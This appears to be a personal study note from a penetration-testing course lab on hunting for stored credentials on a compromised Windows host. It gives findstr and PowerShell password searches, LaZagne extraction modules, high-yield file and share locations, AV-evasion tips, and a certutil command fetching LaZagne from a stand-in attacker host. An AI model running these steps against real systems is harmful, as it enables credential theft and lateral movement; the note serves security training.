# NOTE — Credential Hunting in Windows

## ID
521

## Module
Password Attacks

## Kind
methodology

## Title
Section 15 — Credential Hunting in Windows

## Description
Search a compromised Windows host for stored credentials: Windows Search, LaZagne, `findstr` patterns, share spelunking, IT scripts, GPO files, KeePass DBs, web.config, unattend.xml.

## Tags
credential-hunting, findstr, lazagne, windows-search, sysvol, unattend, web-config, keepass, gpp

## Commands
- `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`
- `lazagne.exe all`
- `lazagne.exe -vv`
- `Get-ChildItem -Path C:\ -Recurse -Filter *.ps1 -ErrorAction SilentlyContinue | Select-String -Pattern "password"`
- `dir /s /b C:\ | findstr /i "passw cred login"`

## Concept Overview
Once you have any shell on a Windows host, *don't* immediately pivot to LSASS. First sweep for plaintext credentials in files — those don't trigger AV and often expose service accounts with broader access than the user you compromised.

## Key Terms to Search For
Cast a wide net — search for any of these in filenames and content:
```
password, passw, passwd, pwd, pass
credential, cred
login, user, account
secret, token, key, apikey, dbpassword
configuration
```

## Hunting Approaches

### Windows Search (GUI)
Quickest on an RDP session. Search bar → `password` → it indexes file content (limited) plus filenames + system settings.

### `findstr` (CLI — content search)
```cmd
cd %USERPROFILE%
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
Flags:
- `/S` — recursive
- `/I` — case-insensitive
- `/M` — print filename only when found
- `/C:"..."` — exact string (treat as literal)

### PowerShell content search
```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.ps1,*.xml,*.txt -ErrorAction SilentlyContinue |
  Select-String -Pattern "password","secret" | Select-Object Path, LineNumber, Line
```

## LaZagne — Mass Extraction
LaZagne hits ~35 browsers + ~50 apps in one shot:
```cmd
lazagne.exe all
```
Modules:
| Module | Targets |
|--------|---------|
| `browsers` | Chrome, Firefox, Edge, Opera, etc. |
| `chats` | Skype, Pidgin, Slack tokens |
| `mails` | Outlook, Thunderbird |
| `memory` | KeePass + LSASS strings |
| `sysadmin` | OpenVPN, WinSCP, FileZilla, Putty, RDCMan |
| `windows` | Credential Manager, LSA secrets |
| `wifi` | Saved WPA keys |

Loud, but comprehensive. AV will flag it — use stealthier methods if AV is active.

## High-Yield Locations to Check

### User Profile
| Path | What |
|------|------|
| `%USERPROFILE%\Desktop\` | Notes, screenshots, "to-do" files |
| `%USERPROFILE%\Documents\` | Spreadsheets, scripts |
| `%USERPROFILE%\AppData\Roaming\` | App configs (RDCMan, mRemoteNG) |
| `%USERPROFILE%\.ssh\` | SSH keys (Windows users using OpenSSH) |

### IT / Admin Shares
| Path | What |
|------|------|
| `\\<dc>\SYSVOL\<domain>\` | Group Policy scripts (often `cpassword` in `Groups.xml`) |
| `\\<dc>\NETLOGON\` | Logon scripts |
| `\\<file>\IT$` | Internal IT share with deployment configs |
| Internal web roots | `web.config` with DB connection strings |

### System Files
| Path | What |
|------|------|
| `C:\unattend.xml` / `C:\Windows\Panther\Unattend.xml` | Deployment answer file — may contain Administrator password |
| `C:\sysprep.inf` / `C:\sysprep\sysprep.xml` | Sysprep answer file |
| `C:\Windows\Panther\Unattended.xml` | Same as above |

### App-specific
| App | Where to look |
|-----|---------------|
| **KeePass** | `*.kdbx` files — try cracking with `keepass2john` |
| **WinSCP** | `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\` (LaZagne `winscp` module) |
| **mRemoteNG** | `confCons.xml` — credentials encrypted with a static key |
| **RDCMan** | `*.rdg` files — DPAPI-encrypted, decryptable with user's session |
| **GitLab/internal Git** | `.git-credentials`, `config` |

### Active Directory User/Computer Description Fields
Admins love leaving passwords here. Enumerate with:
```bash
netexec ldap <dc-ip> -u <user> -p <pass> --query "(objectClass=user)" "samaccountname description"
```

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — Bob's SSH password for switches | **(hidden — see HTB walkthrough)** | Windows Search bar → `password` → opens the txt file |
| Q2 — GitLab access code Bob uses | **(hidden)** | `findstr /SIM /C:"gitlab" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` → opens `GitlabAccessCodeJustIncase.txt` |
| Q3 — Bob's WinSCP file-server creds | **(hidden — `username:password`)** | Download LaZagne via `certutil -urlcache -split -f http://attacker/lazagne.exe C:\Windows\Temp\lazagne.exe`, then `lazagne.exe all` extracts `WinSCP` |
| Q4 — Default password for new ILF domain users | **(hidden)** | Explore `C:\Automation&Scripts\BulkaddADusers.ps1` |
| Q5 — Edge-Router creds | **(hidden — `username:password`)** | `C:\Automation&Scripts\AnsibleScripts\EdgeRouterConfigs` |

## Key Takeaways
- *Search before you exploit.* The next privilege escalation is often sitting in a text file.
- LaZagne is the nuclear option — comprehensive but very noisy.
- Don't forget the *system-wide* `C:\` root. Admins commonly leave deployment scripts and `unattend.xml` in non-standard paths.
- Active Directory description fields are a recurring CTF/real-world quick win — easy to forget.
- IT shares (SYSVOL, NETLOGON, IT$) are the #1 lateral movement source after initial foothold.

## Gotchas
- `findstr` syntax is finicky — use `/C:"..."` for strings with spaces. Without `/C:`, each space is treated as a separate keyword.
- LaZagne uploaded via `certutil` may be killed by AV mid-execution — sometimes you need to drop it into `C:\Windows\Temp\` and run with `-vv` first to verify it loaded.
- File extensions matter for `findstr` — `*.config` and `*.cfg` are different. Cast wide.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[14-attacking-active-directory-and-ntds]] | [[16-linux-authentication-process]] →
<!-- AUTO-LINKS-END -->
